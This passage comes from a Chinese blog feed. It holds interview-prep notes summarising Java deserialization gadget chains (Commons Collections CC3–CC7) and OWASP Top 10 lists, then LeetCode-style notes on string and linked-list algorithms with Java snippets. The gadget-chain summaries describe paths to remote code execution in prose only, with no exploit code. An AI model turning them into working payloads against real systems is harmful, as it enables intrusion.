用对象的<code>transform</code>方法，于是通过<code>InvokerTransformer</code>类的<code>transform</code>方法调用<code>TemplatesImpl.newTransformer</code>方法导致<code>RCE</code>。</td></tr><tr><td>06-12</td><td>谈谈CC3</td><td>该链用到<code>TemplatesImpl</code>类，生成恶意的字节码实例化，仍然是基于动态代理和<code>LazyMap.get</code>触发<code>InstantiateTransformer</code>的<code>transform</code>方法导致<code>RCE</code>。TrAXFilter.TrAXFilter()-&gt;TemplatesImpl.newTransformer()。</td></tr><tr><td>06-12</td><td>谈谈CC4</td><td>和CC2链一致，不过触发时候不是<code>InvokerTransformer</code>而是<code>InstantiateTransformer</code>类直接实例化<code>TrAXFilter</code>子类执行构造器导致<code>RCE</code>。</td></tr><tr><td>06-12</td><td>谈谈CC5</td><td>还是基于<code>LazyMap.get</code>触发的，不过没有动态代理，是通过<code>BadAttributeValueExpException.readObject()</code>调用<code>TiedMapEntry.toString()</code>，在<code>TiedMapEntry.getValue()</code>中存在<code>Map.get</code>导致<code>LazyMap.get</code>触发<code>transform</code>。</td></tr><tr><td>06-12</td><td>谈谈CC6</td><td>还是基于<code>LazyMap.get</code>触发的，通过<code>HashMap.readObject()</code>到达<code>HashMap.hash()</code>方法，由于key是<code>TiedMapEntry</code>所以调用<code>TiedMapEntry.hashCode()</code>,而<code>hashCode</code>方法会调用到<code>TiedMapEntry.getValue()</code>方法，由于<code>Map.get</code>导致<code>LazyMap.get</code>触发<code>transform</code>。</td></tr><tr><td>06-12</td><td>谈谈CC7</td><td>还是基于<code>LazyMap.get</code>触发的，通过<code>Hashtable.readObject()</code>触发了key的<code>equals</code>方法，跟入<code>AbstractMap.equals</code>方法。</td></tr><tr><td>06-12</td><td></td><td></td></tr></tbody></table><h3 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-12</td><td>OWASP top10-2021包含哪些内容</td><td>1.失效的访问控制；2.加密机制失效；3.注入；4.不安全设计；5.安全配置错误；6.自带缺陷或过时的组件；7.身份识别和身份验证错误；8.软件和数据完整性故障；9.安全日志和监控故障；10.服务端请求伪造。（访加注设配，组身整志服）</td></tr><tr><td>06-12</td><td>OWASP top10-2017包含哪些内容</td><td>1.注入；2.失效的身份认证；3.敏感信息泄露；4.XML外部实体；5.失效的访问控制；6.安全配置错误；7.跨站脚本；8.不安全的反序列化；9.使用含有已知漏洞的组件；10.不足的日志记录和监控。</td></tr><tr><td>06-12</td><td></td><td></td></tr><tr><td>06-12</td><td></td><td></td></tr></tbody></table><h3 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h3><table><thead><tr><th>日期</th><th>问题</th><th>答案关键字</th></tr></thead><tbody><tr><td>06-06</td><td>进程间通信的方式、线程间通信的方式</td><td>进程间通信，管道、消息队列、共享内存、信号、信号量socket。线程间通信，wait&#x2F;notify，volatile&#x2F;sychronized实现共享内存？？</td></tr><tr><td>06-11</td><td>进程和线程的区别，什么是协程</td><td></td></tr><tr><td>06-11</td><td></td><td></td></tr><tr><td>06-11</td><td></td><td></td></tr></tbody></table><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><p>1.突然发现本科毕设时，自己的特征工程就处理了粘包问题：“由于 TLS 层分片机制，当 TLS 层数据比较大时，TLS 层载荷会被封装在多个 TCP包中，在 wireshark 中可观察到 Reassembled TCP 数据包。情况复杂时，一个数据包的 TCP 层载荷，可能包含上一个 TLS 层载荷的末尾部分、一个较小的完整 TLS层、以及下一个 TLS 层的开头部分[23]。这些情况是与上一步直接提取 IP 层载荷长度的区别所在。因此，我们尝试编写 Scapy 程序对 TCP 层载荷进行解析，以从碎片化的 TLS 层中正确提取 TLS 层载荷长度。经过这些处理后，我们把 TLS 层载荷对应的时间戳和有向长度写入另一批文件，以进一步分析和进行特征工程。”</p><ol start="2"><li></li></ol><p>9日-计算机网络八股</p><p>备用题目：</p><p>1.讲一下间隙锁，行锁和临建锁，讲一下行锁和表锁。</p><p>2.讲一下常见的oom，java8后还会有方法区的oom吗。</p><p>3.怎么才能让方法区oom呢</p><p>7.30-8.48 : 立扣2道</p><p>1.从Log4j2的CNVD到burpsuite编写扫描插件的原理。</p><p>2.JRASP特性demo的总结。</p><p>3.fastjson不出网利用总结，浅蓝博客中的多种探测技巧，深入分析该漏洞；</p><p>4.linux常见指令总结</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>剑指offer 专项突破</title>
      <link href="/2022/11/14/%E5%89%91%E6%8C%87offer-%E4%B8%93%E9%A1%B9%E7%AA%81%E7%A0%B4/"/>
      <url>/2022/11/14/%E5%89%91%E6%8C%87offer-%E4%B8%93%E9%A1%B9%E7%AA%81%E7%A0%B4/</url>
      
        <content type="html"><![CDATA[<h1 id="剑指Offer专项突破版"><a href="#剑指Offer专项突破版" class="headerlink" title="剑指Offer专项突破版"></a>剑指Offer专项突破版</h1><h2 id="第三章、字符串"><a href="#第三章、字符串" class="headerlink" title="第三章、字符串"></a>第三章、字符串</h2><h3 id="014-字符串中的变位词-567、8月14日"><a href="#014-字符串中的变位词-567、8月14日" class="headerlink" title="014.字符串中的变位词 (567、8月14日)"></a>014.字符串中的变位词 (567、8月14日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：将字符串s1的各种变位词罗列出来，遍历变位词列表，调用某操作String类的API判断是否为子串。</span><br><span class="line">  a.给出子串位置api：s1.indexOf(s2);  </span><br><span class="line">  b.输出字符串的全排列：这是一个典型的回溯过程，每次先将字符串最左边位置与后面其他位置替换，再将左端位置右移一位，返回后则将最左边位置和那个其他位置替换出来，这样每次递进时后面的字符都挨个做当前最左端位置。</span><br><span class="line">      </span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：双指针+hash表。使用hash表记录s2中字符对应位置加<span class="number">1</span>，使用双指针在s1中维护一个和s2长度一致的子串，遍历双指针维护的子串时，将hash表对应字符位置减<span class="number">1</span>，当前子串遍历完毕时hash表全部值为<span class="number">0</span>则说明是变位词。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：两个hashmap比较，一个是s1的词频，另一个是s2的滑动窗口。每次移动只在滑动窗口的hashmap上改变两端，左端字符减一，右端字符加一，再进行两个hashmap的比较，这样就不需要在滑动窗口内部进行遍历。</span><br><span class="line">      </span><br><span class="line"><span class="number">4.</span>HashMap.equals作用于基本数据类型是能实现map的直接整体比较的。观察源码后发现，map1.equals通过entrySet().iterator()这种方式遍历了map1，判断了map2是否含有相同的键m.containsKey(key)，并判断键值是否相等value.equals(m.get(key))。因此，只有value类不是基本数据类型而是自定义类时，重写了equals和hashcode方法，才需要注意这种整体map调用equals是否合理。</span><br></pre></td></tr></table></figure><h3 id="015-字符串中的所有变位词-438、8月15日"><a href="#015-字符串中的所有变位词-438、8月15日" class="headerlink" title="015.字符串中的所有变位词(438、8月15日)"></a>015.字符串中的所有变位词(438、8月15日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：思路同题目<span class="number">14</span>中的思路<span class="number">2</span>，实现两个hashMap比较，将<span class="keyword">return</span> <span class="literal">true</span>替换为result.add(i-p.length()+<span class="number">1</span>)，即窗口左端。</span><br><span class="line"><span class="number">2.</span>变位词题目思路关键：滑动窗口只改变两端词频+双指针实现滑动窗口，hash表或数组实现窗口内词频统计。</span><br></pre></td></tr></table></figure><h3 id="016-不含重复字符的最长连续子字符串-3、8月15日"><a href="#016-不含重复字符的最长连续子字符串-3、8月15日" class="headerlink" title="016.不含重复字符的最长连续子字符串(3、8月15日)"></a>016.不含重复字符的最长连续子字符串(3、8月15日)</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题在<span class="number">7</span>月<span class="number">31</span>日做过，这次做看了下以前的笔记。现在记录的更简单些。</span><br><span class="line">    a.做法是维护一个HashMap&lt;Character,Integer&gt;，记录字符和它的上次出现位置；</span><br><span class="line">    b.向右滑动窗口时，遇到重复字符，就调整窗口的左端，保证窗口左端在重复字符上次出现位置的右边；由于可能窗口左端已经被其他重复字符更新，所以会出现在本来就在本重复字符上次位置右边的情况；</span><br><span class="line">        left = Math.max(left,hashMap.get(s.charAt(i))+<span class="number">1</span>);</span><br><span class="line">    c.滑动窗口中是不含重复字符的子串，即题目需求，就是在向右滑动过程中找到最大的滑动窗口；</span><br><span class="line"><span class="number">2.</span>滑动窗口的感觉：每次滑动只有开销很小的改动。</span><br></pre></td></tr></table></figure><h3 id="017-含有所有字符的最短字符串（76、8月15日、20日）"><a href="#017-含有所有字符的最短字符串（76、8月15日、20日）" class="headerlink" title="017.含有所有字符的最短字符串（76、8月15日、20日）"></a>017.含有所有字符的最短字符串（76、8月15日、20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：因为是求最短字符串且只返回一个，就将外层循环设置为字符串长度，内层循环设置为起始位置。和变位词类似，先用hashMap记录标准t字符串的词频情况，每次遍历一个滑动窗口时，就将标准t的hashMap拷贝一份tempMap，tempMap减去窗口内标准字符次数，全部小于<span class="number">0</span>则为“含所有字符的最短字符串”。因为需要遍历滑动窗口内部，开销很大，所以在测试最后<span class="number">3</span>个测试用例时，出现了超时。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> L=t.length();L&lt;=s.length();L++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i+L-<span class="number">1</span>&lt;s.length();i++)&#123;</span><br><span class="line"><span class="number">2.</span>我的想法<span class="number">2</span>：因为当外层循环确定滑动窗口大小L时，滑动窗口的移动只是改变两端字符的词频，因此不需要遍历滑动窗口改变tempMap，只需要关注两端造成的滑动窗口的词频改变，下一次移动前，计算滑动窗口hashMapS和标准t的hashMap的包含关系即可。但是，因为标准t字符串的长度可能很大，计算包含关系时，遍历标准t的hashMap造成巨大开销，在倒数第<span class="number">2</span>个测试用例上出现超时。</span><br><span class="line"><span class="number">3.</span>我的想法<span class="number">3</span>：当滑动窗口hashMapS某些元素多于标准t的hashMap时，在hashMap中减去该元素，以此减少最后计算包含关系的开销。但随着滑动窗口移动，可能又不再多于，因此不知道如何实现。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>思路<span class="number">1</span>：本题的解题思路很简单，用hashMap记录s当前子串中标准t字符的词频，先移动右指针扩展子串到满足题目，再移动左指针不断刷新minLength。前面说的“可能有不再多于”，这里是通过判断标准t字符的需求解决的：如最开始count = hashMap.size()，当移动右指针满足题目后count减少到<span class="number">0</span>，移动左指针刷新minLength致某刻count&gt;<span class="number">0</span>，说明某字符导致子串不再满足，这时就需要再移动右指针去尝试满足，直到遍历到字符串末尾。</span><br><span class="line">    这里记录下最外层<span class="keyword">while</span>循环：</span><br><span class="line">    <span class="keyword">while</span>(end&lt;s.length()||(end==s.length()&amp;&amp;count==<span class="number">0</span>))</span><br><span class="line">    (end==s.length()&amp;&amp;count==<span class="number">0</span>)是因为，当遍历到最后一个字符且满足t需求时，仍然需要移动左指针刷新minLength；(end==s.length()&amp;&amp;count!=<span class="number">0</span>)则不可，因为没法移动右指针再满足了。这种写法还能应对s和t长度均为<span class="number">1</span>的特殊情况。</span><br></pre></td></tr></table></figure><h3 id="018-有效的回文（125、8月20日）"><a href="#018-有效的回文（125、8月20日）" class="headerlink" title="018.有效的回文（125、8月20日）"></a>018.有效的回文（125、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，就是两指针分别从开始、末尾出发，在满足左指针小于右指针的情况下，移动不是字母或数字的位置，或是在字母或数字位置判断是否回文，并同时移动指针。</span><br><span class="line"><span class="number">2.</span>常用api记录：</span><br><span class="line">Character.isLetterOrDigit  <span class="comment">//返回Boolean,判断字符是否为字母或数字</span></span><br><span class="line">Character.toLowerCase  <span class="comment">//返回字符小写</span></span><br></pre></td></tr></table></figure><h3 id="019-最多删除一个字符得到回文（680、8月20日）"><a href="#019-最多删除一个字符得到回文（680、8月20日）" class="headerlink" title="019.最多删除一个字符得到回文（680、8月20日）"></a>019.最多删除一个字符得到回文（680、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：设置标志位，当flag减少到-<span class="number">1</span>时跳出循环，外层循环是<span class="keyword">while</span>(i&lt;j &amp;&amp; flag&gt;=<span class="number">0</span>)，返回值是<span class="keyword">return</span> i&gt;=j。遇到一种特殊情况无法解决，即在某一刻左指针下一位等于右指针，右指针下一位也等于左指针：如<span class="string">&quot;lcupuu&quot;</span>和<span class="string">&quot;uupucul&quot;</span>，这会导致本来该移动右指针减去一个u，却使得先移动左指针减去一个c。可以想到这种情况适用回溯法。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：递归法。当不满足回文时，移动左指针或者右指针，将标志位flag设置为<span class="literal">false</span>，向下递归。</span><br><span class="line">     <span class="keyword">return</span> check(s,!flag,left+<span class="number">1</span>,right)||check(s,!flag,left,right-<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="020-回文子字符串的个数（647、8月20日）"><a href="#020-回文子字符串的个数（647、8月20日）" class="headerlink" title="020.回文子字符串的个数（647、8月20日）"></a>020.回文子字符串的个数（647、8月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，做了这些滑动窗口的题目，面对这道题还是束手无策。想到从字符串中间开始往两边开滑，那么字符串中间怎么移动呢？如何应对奇数和偶数的区别呢？归根结底是没有看作窗口，滑动窗口是一个子串，需要一个外围循环确定窗口位置，窗口再向两边扩展。</span><br><span class="line"><span class="number">2.</span>这道题直接看题解了，代码非常简单，就是递归。这样就能移动以每个字符为中心的窗口，和前面的题目不同，是递归，而没有滑动窗口对应的存储结构。windowExtend实现计算以i为中心的字符串存在多少回文，或者以(i,i+<span class="number">1</span>)为中心。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123; count += windowExtend(s,i,i); count += windowExtend(s,i,i+<span class="number">1</span>);&#125;</span><br></pre></td></tr></table></figure><h3 id="总结之字符串"><a href="#总结之字符串" class="headerlink" title="总结之字符串"></a>总结之字符串</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>api记录的复制：</span><br><span class="line">    s1.CharAt(index);  <span class="comment">//根据索引确定字符</span></span><br><span class="line">    s1.indexOf(s2);   <span class="comment">//给出子串位置</span></span><br><span class="line">    s.substring(minStart,minEnd);  <span class="comment">//返回子串，包头不包尾</span></span><br><span class="line">String[] t = time.split(<span class="string">&quot;:&quot;</span>);  <span class="comment">//按指定字符分割String</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.join(<span class="string">&quot; &quot;</span>,t) <span class="comment">//按指定分隔符拼接一个字符串</span></span><br><span class="line">    Character.isLetterOrDigit  <span class="comment">//返回Boolean,判断字符是否为字母或数字</span></span><br><span class="line">    Character.toLowerCase  <span class="comment">//返回字符小写</span></span><br><span class="line">    hashMap.put(ch,hashMap.getOrDefault(ch,<span class="number">0</span>)+<span class="number">1</span>);  <span class="comment">//getOrDefault，如果不存在该键就返回默认值0，省去判断</span></span><br><span class="line">    <span class="type">char</span>[] charArray = s.toCharArray();  <span class="comment">//String转char[] String -&gt; char[]</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(charArray);  <span class="comment">//char[]转String  char[] -&gt; String</span></span><br><span class="line"></span><br><span class="line">    result.toString();   <span class="comment">//StringBuffer类转String  StringBuffer -&gt; String</span></span><br><span class="line">  builder.reverse().toString();  <span class="comment">//StringBuffer类转String  先对StringBuffer进行反转</span></span><br><span class="line">    result.append(x); <span class="comment">//StringBuffer添加char型元素</span></span><br><span class="line">    result.deleteCharAt(index);  <span class="comment">//StringBuffer实现根据索引删除元素</span></span><br><span class="line"><span class="number">2.</span>变位词，想到HashMap；回文，想到双指针。</span><br><span class="line"><span class="number">3.</span>StringBuffer和StringBuilder的区别</span><br><span class="line">    标准答案：前者线程安全，后者线程不安全。前者是早期Java设计者避免开发频繁写<span class="keyword">synchronized</span>代码块造成可读性和易用性降低，就把标准库中StringBuffer、Vector、Hashtable、ByteArray&#123;Input,Output&#125;Stream 等可变对象设计成线程安全的。但后来发现多个线程同时修改一个对象的场景才是少数，故后来的ArrayList、HashMap、StringBuilder等可变类不再默认线程安全，以此换取单线程下的性能提升。</span><br><span class="line"><span class="number">4.</span>字符串的比较：</span><br><span class="line">    （<span class="number">1</span>）.String a=<span class="string">&quot;abc&quot;</span>,b=<span class="string">&quot;abc&quot;</span>;   <span class="comment">//a==b将返回true，相同的字符串在内存中只会存一份，a和b都会指向“abc”常量</span></span><br><span class="line">    （<span class="number">2</span>）.String a=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>); String b=<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);   </span><br><span class="line"><span class="comment">//a==b将返回false，a和b指向不同的对象</span></span><br><span class="line"><span class="comment">//a.equals(b)是比较字符串内容是否相同</span></span><br><span class="line"><span class="comment">//字符串值比较一定要用s.equals(&quot;0&quot;)，而不是s==&quot;0&quot;，这里s是通过&quot;&quot;+ch不断累加得到的。</span></span><br><span class="line"><span class="number">5.</span><span class="type">int</span>和String互相转换api：</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.parseInt(str);<span class="comment">//String转int</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> Integer.valueOf(str).intValue();<span class="comment">//String装int</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> String.valueOf(n);<span class="comment">//int转String</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Integer.toString(n);<span class="comment">//int转String</span></span><br><span class="line"><span class="number">6.</span>ascii转换api：</span><br><span class="line">    <span class="type">char</span> <span class="variable">zimu</span> <span class="operator">=</span> (<span class="type">char</span>)(<span class="number">96</span>+<span class="number">1</span>);   <span class="comment">//结果为a</span></span><br><span class="line"><span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> ch-<span class="string">&#x27;a&#x27;</span> <span class="comment">//结果为a的ascii编号</span></span><br><span class="line"><span class="number">7.</span>双层List&lt;List&lt;String&gt;&gt; 转 String[][]，内层不定长时的coding技巧：</span><br><span class="line">    String[][] finals = <span class="keyword">new</span> <span class="title class_">String</span>[results.size()][];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;results.size();i++)&#123;</span><br><span class="line">        List&lt;String&gt; list = results.get(i);</span><br><span class="line">        finals[i] = list.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[list.size()]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">8.</span><span class="type">char</span>转<span class="type">int</span>：</span><br><span class="line">    <span class="type">int</span> <span class="variable">number</span> <span class="operator">=</span> Integer.parseInt(String.valueOf(charArray[i]));</span><br><span class="line"><span class="number">9.</span>字符串和整数比较方法：</span><br><span class="line"><span class="type">String</span> <span class="variable">tmp</span> <span class="operator">=</span> src.substring(i-<span class="number">1</span>,i+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(tmp.compareTo(<span class="string">&quot;25&quot;</span>)&lt;=<span class="number">0</span>)<span class="comment">//判断字符串是否小于等于25</span></span><br><span class="line"><span class="number">10.</span>arrs[i].equals(<span class="string">&quot;null&quot;</span>) 和 arrs[i]==<span class="string">&quot;null&quot;</span></span><br><span class="line">不能用arrs[i]==<span class="string">&quot;null&quot;</span>去比较字符串，因为arrs[i]是split分割字符串得到的，应该是调用了<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;xxx&quot;</span>)，这是新的对象，比较结果必然是<span class="literal">false</span>，应该用equals比较字符串内容。</span><br></pre></td></tr></table></figure><h2 id="第四章、链表"><a href="#第四章、链表" class="headerlink" title="第四章、链表"></a>第四章、链表</h2><h3 id="021-删除链表的倒数第n个节点（19、8月21日）"><a href="#021-删除链表的倒数第n个节点（19、8月21日）" class="headerlink" title="021.删除链表的倒数第n个节点（19、8月21日）"></a>021.删除链表的倒数第n个节点（19、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，前后指针。先让一个指针first跑n个节点，再让另一个指针tail和first一起跑，这样当first到达链表末尾时，tail正好到达倒数第n个节点的前一个节点。设置dummy节点，将帮助更好理解第n个以及处理单节点输入的特殊情况。这道题调试几次就对了。</span><br></pre></td></tr></table></figure><h3 id="022-链表中环的入口节点（142、8月21日）"><a href="#022-链表中环的入口节点（142、8月21日）" class="headerlink" title="022.链表中环的入口节点（142、8月21日）"></a>022.链表中环的入口节点（142、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：一个指针遍历到某位置，下个指针从该位置开始遍历，直到与第一个指针重合。但是，循环链表没有<span class="literal">null</span>，导致循环无法停止。</span><br><span class="line"><span class="number">2.</span>我的想法<span class="number">2</span>：将链表节点放入HashSet，当再次遍历到且HashSet已经存储某节点时，就说明该节点是循环链表的入口。如果遍历链表时遇到<span class="literal">null</span>节点，说明该链表不是循环链表。注意，Set&lt;ListNode&gt;而不是Set&lt;Integer&gt;，因为测试用例中存在相同值的不同节点。</span><br><span class="line"><span class="number">3.</span>我在想，能快速写出测试用例、方便调试也算能力吧。</span><br><span class="line">    </span><br><span class="line"><span class="number">4.</span>思路<span class="number">2</span>：快慢指针。如果链表中有环，快慢两个指针必然会在环中某个节点相遇。假设快指针走两步、慢指针走一步，相遇时慢指针走了k步，快指针走了2k步，到相遇时快指针比慢指针多走k步，那么k必然是环中节点数目的整数倍，那么非环部分a+没走满的部分b=节点数目整数倍，假如一个指针headA从头节点出发，另一个指针headB从相遇慢指针的k位置出发，相同速度均为一步，那么它们都需要走a个单位到达环入口。</span><br><span class="line"><span class="number">5.</span>证明：快慢指针。设链表中环外部分的长度为a，slow指针进入环后，又走了b的距离与fast相遇，还剩c的距离凑够完整环。此时，fast指针已经走完了n圈，总距离为a+n(b+c)+b，而fast指针速度为<span class="number">2</span>，slow指针速度为<span class="number">1</span>，故有：</span><br><span class="line">    a+n(b+c)+b = <span class="number">2</span>(a+b)  -&gt;  a=c+(n-<span class="number">1</span>)(b+c)</span><br><span class="line">-&gt; 从相遇点到入环点的距离加上 n-<span class="number">1</span> 圈的环长，恰好等于从链表头部到入环点的距离。</span><br></pre></td></tr></table></figure><h3 id="023-两个链表的第一个重合节点（160、8月21日）"><a href="#023-两个链表的第一个重合节点（160、8月21日）" class="headerlink" title="023.两个链表的第一个重合节点（160、8月21日）"></a>023.两个链表的第一个重合节点（160、8月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：将链表节点放入HashSet。headA链表先遍历一遍，将节点放入hashSet，再遍历headB链表，当遍历到hashSet中已有节点时，说明该节点是重合节点，否则，返回<span class="literal">null</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：快慢指针。假设链表headA=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]，链表headB=[<span class="number">7</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],那么可以让链表headB变为环（headB的尾节点next指向headB的头节点），整个链表变为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>]，其中<span class="number">8</span>指向<span class="number">4</span>，问题转换为寻找链表环的入口节点。但这样会改变链表结构。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>：栈。将两个链表压入两个栈，弹栈顶比较元素，直到最后一个相同元素，即从后往前比较。扩展这一想法，可以先求得两个链表的长度，将长的链表先移动d位差值，然后两个链表再同时同速度移动，这样就能同时到达交叉位置。</span><br></pre></td></tr></table></figure><h3 id="024-反转链表（206、8月22日）"><a href="#024-反转链表（206、8月22日）" class="headerlink" title="024.反转链表（206、8月22日）"></a>024.反转链表（206、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，遍历链表节点并压栈，弹栈后在最后一个元素后接<span class="literal">null</span>。这里记录下栈相关api:</span><br><span class="line">Deque&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();</span><br><span class="line">peek()：返回栈顶的值 ；不改变栈的值，查看栈顶的对象而不移除它。</span><br><span class="line">pop()：Stack(栈)的方法，返回栈顶的值 ；会把栈顶的值删除。</span><br><span class="line">poll：Queue(队列)的一个方法，获取并移除此队列的头，如果此队列为空，则返回<span class="literal">null</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：迭代法。遍历时维护两个指针prev和cur，每轮遍历将cur.next存储起来，将cur.next修改为指向prev后，完成向前连接；接着将prev指向cur，将cur指向储存的cur.next提供下一轮遍历条件。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：递归法，先不做。</span><br></pre></td></tr></table></figure><h3 id="025、链表中的两数相加（445、8月22日）"><a href="#025、链表中的两数相加（445、8月22日）" class="headerlink" title="025、链表中的两数相加（445、8月22日）"></a>025、链表中的两数相加（445、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，维护两个栈l1stack和l2stack，遍历两个链表并压栈，弹栈时求和，注意将最后的进位添加节点。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：先用<span class="number">24</span>题迭代法反转两个链表，再按照相同的加法逻辑求和。</span><br></pre></td></tr></table></figure><h3 id="026、重排链表（143、8月22日）"><a href="#026、重排链表（143、8月22日）" class="headerlink" title="026、重排链表（143、8月22日）"></a>026、重排链表（143、8月22日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法：观察图示，即将链表转换为正向、逆向交替添加到链表。只需要将链表反转压栈，通过栈求得链表长度，按照链表长度遍历索引，如果索引模<span class="number">2</span>余<span class="number">0</span>则正向添加链表节点，如果索引模<span class="number">2</span>余<span class="number">1</span>则弹栈添加逆向链表节点，在外部修改链表结构并不会影响弹栈顺序，且弹栈后会直接修改next指针。注意将最后一个元素后接<span class="literal">null</span>避免环状链表，以及修改head指针指向dummy.next（因为函数返回<span class="keyword">void</span>）。</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)  <span class="comment">//因为目标建立len长度的链表，正向和逆向在结束时，实际都只遍历一半</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：线性表。通过线性表的特定按顺序交替获取元素。</span><br><span class="line">        List&lt;ListNode&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;ListNode&gt;();  <span class="comment">//线性表建表</span></span><br><span class="line">        list.get(i).next = list.get(j);<span class="comment">//线性表获取元素</span></span><br><span class="line"><span class="number">3.</span>寻找链表中点（通过快慢指针） + 链表逆序 + 合并链表，先不做，和我的想法本质一样，但更加节省空间。</span><br></pre></td></tr></table></figure><h3 id="027、回文链表（234、8月22日）"><a href="#027、回文链表（234、8月22日）" class="headerlink" title="027、回文链表（234、8月22日）"></a>027、回文链表（234、8月22日）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.我的想法：遍历链表节点并压栈。在外围循环为for(int i=0;i&lt;len/2;i++)的情况下，遍历链表并同时弹栈，观察到node.val不相等时返回false，否则循环结束返回true。为什么是len/2，nodes = [1,2,3,2,1]，len=5，&lt;5/2 = &#123;0,1&#125;。</span><br><span class="line">2.思路2：递归法，先不做。</span><br></pre></td></tr></table></figure><h3 id="028、展平多级双向链表（430、8月23日）"><a href="#028、展平多级双向链表（430、8月23日）" class="headerlink" title="028、展平多级双向链表（430、8月23日）"></a>028、展平多级双向链表（430、8月23日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题目在看到它的序列化输入时，就已经被震慑住了。看书后明白，就是链表的节点既维护双向链表的两个指针prev和next，还维护一个指向子链表的指针child，题目需求是将子链表向上整合到原链表的两个节点之间。因此是典型的递归操作。</span><br><span class="line"><span class="number">2.</span>看懂题解后复现比较简单，就是维护当前链表遍历指针node和尾指针tail，通过node遍历链表时，如果该节点存在子节点child，维护指针Child存储node.child，将node.child置为<span class="literal">null</span>，并通过Child指针递归寻找链尾，在每轮遍历将tail指向新表尾。</span><br></pre></td></tr></table></figure><h3 id="029、排序的循环链表（708、8月24日）"><a href="#029、排序的循环链表（708、8月24日）" class="headerlink" title="029、排序的循环链表（708、8月24日）"></a>029、排序的循环链表（708、8月24日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法:这道题就是在循环链表中，按照大小顺序插入链表。通过<span class="keyword">while</span>(tail.next!=head)遍历链表节点，会遇到两种情况：</span><br><span class="line">    a.插入节点位于从小到大链表的中间</span><br><span class="line">    <span class="keyword">if</span>(insertVal &gt;= tail.val &amp;&amp; insertVal &lt;= tail.next.val)</span><br><span class="line">    b.插入节点位于从小到大链表的开始或末尾</span><br><span class="line">    <span class="keyword">if</span>(tail.val&gt; tail.next.val)</span><br><span class="line">                <span 